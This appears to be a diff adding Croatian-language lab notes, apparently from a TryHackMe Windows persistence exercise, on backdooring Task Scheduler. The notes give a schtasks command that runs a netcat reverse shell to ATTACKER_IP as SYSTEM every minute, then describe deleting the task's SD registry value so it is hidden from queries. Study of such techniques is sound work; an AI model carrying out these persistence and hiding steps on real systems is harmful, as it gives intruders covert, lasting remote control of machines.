@@ -1,0 +1,22 @@
+Task Scheduler
+Najjednostavniji nacin da izmjenimo Scheduler tako da pokrece nas kod.
+Preko ove naredbe dodajemo task u Scheduler:
+
+C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
+
+Sada kada zelimo provjeriti nase schtasks mozemo upisati naredbu:
+
+schtasks /query /tn thm-TaskBackdoor
+
+Kako bi napravili da je servis nevidljiv kornisicima da bude teže primjecen koristimo:
+
+C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
+
+Idemo u Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{Ime servisa}
+
+Kada udemo u servis preko registrija tražimo REG_BINARY naziva SD i brišemo ga.
+Kako bi provjerili moze li se servis locairati:
+
+schtasks /query /tn thm-taskbackdoor
+
+Ako nam izbaci error znaci da smo dobro napravili.
